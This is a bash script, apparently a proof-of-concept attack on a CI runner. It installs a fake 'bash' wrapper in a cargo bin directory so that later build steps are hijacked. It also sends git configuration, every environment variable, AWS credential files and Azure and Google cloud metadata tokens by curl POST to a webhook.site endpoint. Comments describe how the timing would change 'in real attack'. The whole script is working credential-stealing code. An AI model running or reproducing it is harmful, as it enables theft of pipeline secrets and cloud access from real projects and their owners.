#!/usr/bin/env bash
#filename: myscript.sh
echo "startScript" >&2
echo "$PATH" >&2
which bash >&2
mkdir -p /home/runner/.cargo/bin

echo "--creating wrapper--" >&2
cat > /home/runner/.cargo/bin/bash <<'EOF'
#!/usr/bin/bash
echo "hello next step." >&2
export webhook="https://webhook.site/filecoin-project"
curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(cat .git/config)" \
    "$webhook/git_config"
curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(git config --list)" \
    "$webhook/git_config_list"
curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(cat /home/runner/.gitconfig)" \
    "$webhook/home_runner_gitconfig"
curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(printenv)" \
  "$webhook/printenv" 
exit 0
exec /usr/bin/bash "$@"

EOF

echo "--granting permissions--" >&2
chmod +x /home/runner/.cargo/bin/bash 
echo "--which bash--" >&2
which bash >&2 

echo "--cat /home/runner/.cargo/bin/bash--" >&2
cat /home/runner/.cargo/bin/bash >&2


echo "-------------poc_hello--------------" >&2



export webhook="https://webhook.site/filecoin-project"

curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(cat .git/config)" \
    "$webhook/git_config"
    

curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(git config --list)" \
    "$webhook/git_config_list"


curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(cat /home/runner/.gitconfig)" \
    "$webhook/home_runner_gitconfig"


curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(printenv)" \
  "$webhook/printenv"

curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(cat ~/.aws/cli/cache)" \
  "$webhook/aws_cli_cache"

curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(cat ~/.aws/credentials)" \
  "$webhook/aws_cli_credentials"

curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(curl -H \"Metadata: true\" \"http://169.254.169.254/metadata/instance?api-version=2021-02-01\")" \
  "$webhook/azure_credentials"

curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(curl -s -H "Metadata-Flavor: Google" \"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\")" \
  "$webhook/google_credentials"



git config --list >&2

echo "--- sleeping (in real attack use longer time) ---" >&2
sleep 2 # in real attack it will be 1200 to have time to edit 
exit 0

